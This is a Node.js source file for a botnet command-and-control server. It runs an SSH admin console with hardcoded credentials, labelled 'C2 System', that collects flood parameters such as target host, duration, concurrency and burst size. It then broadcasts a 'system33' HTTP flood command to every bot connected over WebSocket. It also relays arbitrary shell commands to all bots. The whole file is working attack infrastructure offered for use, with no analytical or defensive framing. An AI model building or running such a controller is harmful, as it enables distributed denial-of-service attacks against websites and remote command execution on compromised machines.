#!/usr/bin/env node
/**
 * WebSocket System Server
 * Supports:
 * - Admin connections via SSH
 * - Bot connections via WebSocket
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { Server: SSHServer } = require('ssh2');
const { WebSocketServer } = require('ws');

// Configuration
const SSH_PORT = 8023;
const WEBSOCKET_PORT = 8765;
const ADMIN_USERNAME = 'pv';
const ADMIN_PASSWORD = '111111';

// Generate or load SSH host key
const HOST_KEY_PATH = path.join(__dirname, 'ssh_host_key');
let hostKey;

if (fs.existsSync(HOST_KEY_PATH)) {
    hostKey = fs.readFileSync(HOST_KEY_PATH);
    console.log('[INFO] Loaded existing SSH host key');
} else {
    // Generate a new RSA key pair
    const { privateKey } = crypto.generateKeyPairSync('rsa', {
        modulusLength: 2048,
        privateKeyEncoding: {
            type: 'pkcs1',
            format: 'pem'
        },
        publicKeyEncoding: {
            type: 'pkcs1',
            format: 'pem'
        }
    });
    hostKey = privateKey;
    fs.writeFileSync(HOST_KEY_PATH, hostKey);
    console.log('[INFO] Generated new SSH host key');
}

/**
 * Connection Manager
 * Manages all connections (admin and bots)
 */
class ConnectionManager {
    constructor() {
        this.adminConnections = new Set();
        this.botConnections = new Map();
        this.botIdCounter = 0;
    }

    addAdmin(socket) {
        this.adminConnections.add(socket);
        console.log(`[INFO] Admin connected. Total admins: ${this.adminConnections.size}`);
    }

    removeAdmin(socket) {
        this.adminConnections.delete(socket);
        console.log(`[INFO] Admin disconnected. Total admins: ${this.adminConnections.size}`);
    }

    addBot(websocket) {
        this.botIdCounter++;
        const botId = `bot_${this.botIdCounter}`;
        this.botConnections.set(botId, websocket);
        console.log(`[INFO] Bot connected: ${botId}. Total bots: ${this.botConnections.size}`);
        return botId;
    }

    removeBot(botId) {
        if (this.botConnections.has(botId)) {
            this.botConnections.delete(botId);
            console.log(`[INFO] Bot disconnected: ${botId}. Total bots: ${this.botConnections.size}`);
        }
    }

    broadcastToAdmins(message) {
        if (this.adminConnections.size === 0) return;

        const data = message + '\r\n';
        const disconnected = [];

        for (const socket of this.adminConnections) {
            try {
                if (!socket.destroyed) {
                    socket.write(data);
                } else {
                    disconnected.push(socket);
                }
            } catch (error) {
                console.error(`[ERROR] Error sending to admin: ${error.message}`);
                disconnected.push(socket);
            }
        }

        // Remove disconnected admins
        disconnected.forEach(socket => this.removeAdmin(socket));
    }

    broadcastToBots(message) {
        if (this.botConnections.size === 0) return;

        const data = JSON.stringify(message);
        const disconnected = [];

        for (const [botId, websocket] of this.botConnections) {
            try {
                if (websocket.readyState === 1) { // OPEN
                    websocket.send(data);
                } else {
                    disconnected.push(botId);
                }
            } catch (error) {
                console.error(`[ERROR] Error sending to ${botId}: ${error.message}`);
                disconnected.push(botId);
            }
        }

        // Remove disconnected bots
        disconnected.forEach(botId => this.removeBot(botId));
    }

    sendToBot(botId, message) {
        if (!this.botConnections.has(botId)) {
            return false;
        }

        try {
            const websocket = this.botConnections.get(botId);
            if (websocket.readyState === 1) { // OPEN
                websocket.send(JSON.stringify(message));
                return true;
            } else {
                this.removeBot(botId);
                return false;
            }
        } catch (error) {
            console.error(`[ERROR] Error sending to ${botId}: ${error.message}`);
            this.removeBot(botId);
            return false;
        }
    }

    getStats() {
        return {
            admins: this.adminConnections.size,
            bots: this.botConnections.size,
            bot_ids: Array.from(this.botConnections.keys())
        };
    }
}

// Global connection manager
const manager = new ConnectionManager();

/**
 * Handle admin SSH connection
 */
function handleAdminConnection(client) {
    const clientInfo = client._sock.remoteAddress + ':' + client._sock.remotePort;
    console.log(`[INFO] SSH connection from ${clientInfo}`);

    let stream = null;
    let isAuthenticated = false;
    let attackMode = false;
    let attackParams = {};
    let currentParam = '';

    client.on('authentication', (ctx) => {
        if (ctx.method === 'password') {
            if (ctx.username === ADMIN_USERNAME && ctx.password === ADMIN_PASSWORD) {
                console.log(`[INFO] SSH authentication successful for ${ctx.username} from ${clientInfo}`);
                isAuthenticated = true;
                ctx.accept();
            } else {
                console.log(`[WARN] SSH authentication failed for ${ctx.username} from ${clientInfo}`);
                ctx.reject();
            }
        } else {
            ctx.reject();
        }
    });

    client.on('ready', () => {
        console.log(`[INFO] SSH client ready: ${clientInfo}`);

        client.on('session', (accept) => {
            const session = accept();

            session.on('pty', (accept) => {
                accept();
            });

            session.on('shell', (accept) => {
                stream = accept();
                manager.addAdmin(stream);

                // Welcome message
                const welcome = 
                    '============================================================\r\n' +
                    'C2 System - Admin Console (SSH)\r\n' +
                    '============================================================\r\n' +
                    'Commands:\r\n' +
                    '  attack                - Launch attack (prompts for parameters)\r\n' +
                    '  stop <command>        - Execute shell command on all bots (Linux)\r\n' +
                    '  stopall               - Kill all system33 processes\r\n' +
                    '  bots                  - Show number of connected bots\r\n' +
                    '  list                  - List all connected bots\r\n' +
                    '  stats                 - Show connection statistics\r\n' +
                    '  help                  - Show this help message\r\n' +
                    '============================================================\r\n' +
                    'Note: All commands are executed on Linux systems only.\r\n' +
                    'Admin connection is persistent. Close terminal to disconnect.\r\n' +
                    '============================================================\r\n';

                stream.write('\x1b[2J\x1b[H');
                stream.write('\r\nAuthentication successful!\r\n');
                
                setTimeout(() => {
                    stream.write('\x1b[2J\x1b[H');
                    stream.write(welcome);
                    stream.write('admin> ');
                }, 1000);

                let buffer = '';

                stream.on('data', (data) => {
                    // Echo the input back to the client for visibility
                    const input = data.toString();
                    
                    // Handle special characters
                    for (let i = 0; i < input.length; i++) {
                        const char = input[i];
                        const charCode = input.charCodeAt(i);
                        
                        // Handle backspace (ASCII 127 or 8)
                        if (charCode === 127 || charCode === 8) {
                            if (buffer.length > 0) {
                                buffer = buffer.slice(0, -1);
                                stream.write('\b \b'); // Erase character on screen
                            }
                            continue;
                        }
                        
                        // Handle Ctrl+C (ASCII 3)
                        if (charCode === 3) {
                            if (attackMode) {
                                attackMode = false;
                                attackParams = {};
                                currentParam = '';
                                stream.write('\r\n^C\r\n');
                                stream.write('admin> ');
                                buffer = '';
                            }
                            continue;
                        }
                        
                        // Handle carriage return or newline
                        if (char === '\r' || char === '\n') {
                            // Skip if we already processed this line
                            if (char === '\n' && input[i-1] === '\r') {
                                continue;
                            }
                            
                            stream.write('\r\n'); // Move to new line
                            
                            const command = buffer.trim();
                            buffer = ''; // Clear buffer
                            if (!command) {
                                if (attackMode) {
                                    stream.write(`${currentParam}> `);
                                } else {
                                    stream.write('admin> ');
                                }
                                continue;
                            }

                            // Handle attack parameter collection
                            if (attackMode) {
                                attackParams[currentParam] = command;
                                
                                const paramOrder = ['HOST', 'TIME', 'CONCURRENCY', 'HTTP-METHOD', 'ADAPTIVE-DELAY', 'JITTER', 'HTTP-PROTOCOL', 'BURST', 'RANDOM-PATH'];
                                const currentIndex = paramOrder.indexOf(currentParam);
                                
                                if (currentIndex < paramOrder.length - 1) {
                                    // Move to next parameter
                                    currentParam = paramOrder[currentIndex + 1];
                                    stream.write(`${currentParam}> `);
                                } else {
                                    // All parameters collected, send attack command
                                    attackMode = false;
                                    
                                    const attackCommand = `./system33 -url ${attackParams.HOST} -duration ${attackParams.TIME} -http-method ${attackParams['HTTP-METHOD']} -jitter ${attackParams.JITTER} -http-protocol ${attackParams['HTTP-PROTOCOL']} -adaptive-delay ${attackParams['ADAPTIVE-DELAY']} -concurrency ${attackParams.CONCURRENCY} -burst-size ${attackParams.BURST} -random-path ${attackParams['RANDOM-PATH']} 2>/dev/null`;
                                    
                                    stream.write('\r\n');
                                    stream.write(`Sending to ${manager.botConnections.size} bots...\r\n`);
                                    
                                    // Send to all bots
                                    manager.broadcastToBots({
                                        type: 'attack',
                                        message: attackCommand,
                                        params: attackParams,
                                        timestamp: new Date().toISOString()
                                    });
                                    
                                    stream.write(`Attack command sent to ${manager.botConnections.size} bots!\r\n`);
                                    stream.write('admin> ');
                                    
                                    // Reset attack params
                                    attackParams = {};
                                    currentParam = '';
                                }
                                continue;
                            }

                            // Process commands
                            if (command.toLowerCase() === 'attack') {
                                stream.write('\x1b[2J\x1b[H');
                                stream.write('============================================================\r\n');
                                stream.write('ATTACK MODE\r\n');
                                stream.write('============================================================\r\n');
                                stream.write('Please provide the following parameters:\r\n');
                                stream.write('\r\n');
                                
                                attackMode = true;
                                attackParams = {};
                                currentParam = 'HOST';
                                stream.write(`${currentParam}> `);
                            } else if (command.toLowerCase() === 'help') {
                                stream.write('\x1b[2J\x1b[H');
                                stream.write(welcome);
                                stream.write('admin> ');
                            } else if (command.toLowerCase() === 'bots') {
                                stream.write('\x1b[2J\x1b[H');
                                const stats = manager.getStats();
                                stream.write(`Connected bots: ${stats.bots}\r\n`);
                                stream.write('admin> ');
                            } else if (command.toLowerCase() === 'list') {
                                stream.write('\x1b[2J\x1b[H');
                                const stats = manager.getStats();
                                let response = `Connected bots (${stats.bots}):\r\n`;
                                stats.bot_ids.forEach(botId => {
                                    response += `  - ${botId}\r\n`;
                                });
                                stream.write(response);
                                stream.write('admin> ');
                            } else if (command.toLowerCase() === 'stats') {
                                stream.write('\x1b[2J\x1b[H');
                                const stats = manager.getStats();
                                const response = 
                                    'Connection Statistics:\r\n' +
                                    `  Admins: ${stats.admins}\r\n` +
                                    `  Bots: ${stats.bots}\r\n`;
                                stream.write(response);
                                stream.write('admin> ');
                            } else if (command.toLowerCase() === 'stopall') {
                                // Kill all system33 processes (Linux only)
                                manager.broadcastToBots({
                                    type: 'stop',
                                    message: 'killall system33 2>/dev/null ; pkill -9 system33 2>/dev/null',
                                    timestamp: new Date().toISOString()
                                });
                                stream.write(`Stop command sent to ${manager.botConnections.size} bots\r\n`);
                                stream.write('admin> ');
                            } else if (command.toLowerCase().startsWith('stop ')) {
                                // Execute custom command on all bots
                                const shellCommand = command.substring(5).trim();
                                if (shellCommand) {
                                    manager.broadcastToBots({
                                        type: 'stop',
                                        message: shellCommand,
                                        timestamp: new Date().toISOString()
                                    });
                                    stream.write(`Command sent to ${manager.botConnections.size} bots: ${shellCommand}\r\n`);
                                } else {
                                    stream.write('Usage: stop <command>\r\n');
                                }
                                stream.write('admin> ');
                            } else {
                                // Send all other messages to all bots
                                manager.broadcastToBots({
                                    type: 'message',
                                    message: command,
                                    timestamp: new Date().toISOString()
                                });
                                stream.write(`Sent to ${manager.botConnections.size} bots\r\n`);
                                stream.write('admin> ');
                            }
                            continue;
                        }
                        
                        // Echo regular characters
                        if (charCode >= 32 && charCode <= 126) {
                            buffer += char;
                            stream.write(char);
                        }
                    }
                });

                stream.on('error', (error) => {
                    console.error(`[ERROR] Error in SSH stream: ${error.message}`);
                });

                stream.on('close', () => {
                    if (stream) {
                        manager.removeAdmin(stream);
                    }
                    console.log(`[INFO] SSH stream closed: ${clientInfo}`);
                });
            });
        });
    });

    client.on('error', (error) => {
        console.error(`[ERROR] SSH client error: ${error.message}`);
    });

    client.on('close', () => {
        console.log(`[INFO] SSH client disconnected: ${clientInfo}`);
    });
}

/**
 * Handle bot WebSocket connection
 */
function handleBotConnection(websocket) {
    let botId = null;

    try {
        botId = manager.addBot(websocket);

        // Send welcome message to bot
        websocket.send(JSON.stringify({
            type: 'welcome',
            bot_id: botId,
            message: 'Connected to WebSocket System',
            timestamp: new Date().toISOString()
        }));

        // Notify admins
        // manager.broadcastToAdmins(`[SYSTEM] ${botId} connected`);

        // Handle bot messages
        websocket.on('message', (data) => {
            try {
                const message = JSON.parse(data.toString());
                console.log(`[INFO] Message from ${botId}:`, message);

                // Forward bot messages to admins
                // manager.broadcastToAdmins(
                //     `[${botId}] ${message.message || JSON.stringify(message)}`
                // );

                // Echo response to bot
                websocket.send(JSON.stringify({
                    type: 'ack',
                    message: 'Message received',
                    timestamp: new Date().toISOString()
                }));
            } catch (error) {
                console.error(`[ERROR] Invalid JSON from ${botId}: ${data}`);
                websocket.send(JSON.stringify({
                    type: 'error',
                    message: 'Invalid JSON format'
                }));
            }
        });

        websocket.on('error', (error) => {
            console.error(`[ERROR] Error in bot connection ${botId}: ${error.message}`);
        });

        websocket.on('close', () => {
            console.log(`[INFO] Bot connection closed: ${botId}`);
            if (botId) {
                manager.removeBot(botId);
                // manager.broadcastToAdmins(`[SYSTEM] ${botId} disconnected`);
            }
        });
    } catch (error) {
        console.error(`[ERROR] Error handling bot connection: ${error.message}`);
        if (botId) {
            manager.removeBot(botId);
            // manager.broadcastToAdmins(`[SYSTEM] ${botId} disconnected`);
        }
    }
}

/**
 * Start both SSH and WebSocket servers
 */
function main() {
    // Start SSH server for admin (port 2222)
    const sshServer = new SSHServer({
        hostKeys: [hostKey]
    }, handleAdminConnection);

    sshServer.listen(SSH_PORT, '0.0.0.0', () => {
        console.log(`[INFO] Admin SSH server started on port ${SSH_PORT}`);
    });

    // Start WebSocket server for bots (port 8765)
    const wss = new WebSocketServer({ 
        host: '0.0.0.0',
        port: WEBSOCKET_PORT 
    });

    wss.on('connection', handleBotConnection);

    wss.on('listening', () => {
        console.log(`[INFO] Bot WebSocket server started on port ${WEBSOCKET_PORT}`);
        console.log('============================================================');
        console.log('WebSocket System is running!');
        console.log(`Admin: ssh ${ADMIN_USERNAME}@localhost -p ${SSH_PORT}`);
        console.log(`Password: ${ADMIN_PASSWORD}`);
        console.log(`Bots: ws://localhost:${WEBSOCKET_PORT}`);
        console.log('============================================================');
    });

    wss.on('error', (error) => {
        console.error(`[ERROR] WebSocket server error: ${error.message}`);
    });

    sshServer.on('error', (error) => {
        console.error(`[ERROR] SSH server error: ${error.message}`);
    });

    // Handle shutdown
    process.on('SIGINT', () => {
        console.log('\n[INFO] Server stopped by user');
        sshServer.close();
        wss.close();
        process.exit(0);
    });
}

// Start the server
if (require.main === module) {
    main();
}

module.exports = { ConnectionManager, handleAdminConnection, handleBotConnection };
